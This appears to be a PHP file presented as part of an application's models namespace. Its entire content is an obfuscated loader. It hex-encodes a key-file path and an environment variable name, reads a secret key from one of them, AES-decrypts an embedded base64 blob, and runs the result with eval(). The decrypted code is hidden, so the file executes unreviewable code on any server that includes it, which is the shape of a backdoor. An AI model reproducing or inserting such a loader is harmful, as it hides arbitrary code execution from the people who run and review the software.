<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Zvk1lwS2AxloCpIw8jsDZA==');

$c=base64_decode(

'Mgjy1Fjq3XG/AR0c6tuFP1Efd/Kdr0bLdt8xz+5+vZoVj8ifNMMufEEJPV8ZrPLXf5TmFNDmoEuh' .
'OEOU4fh+BbK5KN1ZhTq0cYm9LLC6k3mdAK6hCS7Q3eVw7FznZu7sWlRGQMI6nvL60kG6rxKHXQ4M' .
'I+yVXAkKy6HUKxyiJEInDMg7uR83K/33cbfN0XGzlezttjTEh9S7SoweR5tD5HQPY7wZhe7HaHQ7' .
'9jmuV9/xCcb+tDs/WDyWKKmEtnXXQj9D6f9CncqfxGefob8cPCXtZEQoeLyFtCDqCKibwcJ2ncDH' .
'FL6bXnNATbnX70fhSnECBI5cxEJzm/h1lOnhHOGiN++VL/f/exJb5ESn4nLUHidqRYrT2CRZXMDL' .
'TWkOnGPKkrZS/jfAnk0hsxGvGTb0v/5uB4deQ2xBIse9c1yiHaoH9DVAh2chX0tPzXy5R0yclhcp' .
'6vXWS5qOVZ9NYAMARADnl1kHylCBIEqd6Y+7LvT8deFVEEKbbBQcS2fo6W1TFdw0yEBSzr4Nr/36' .
'HyJAfdN+Bh39KWBUutBQReQmAPzbLT9nbZUDogqabEKaYCaZOuWJDZJT2K1AR4IoDnkmotJ1fYVB' .
'KbuKhli9VWIH8KznsJP5+ASMNAHr//iuvE5yGv/cIBCog0SHQb3MoajbrDjpmY6kwNAi4bK+w/o5' .
'Ove70yiJRRwPh9GzrEl4NBYSwM8dNaylee9se1uelS4m5pgUEjYmoPE1dd7XsMlNcpXIoPf1CyoY' .
'Kf0knNhHunioMeOHaOoGSt4FdUAKgw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

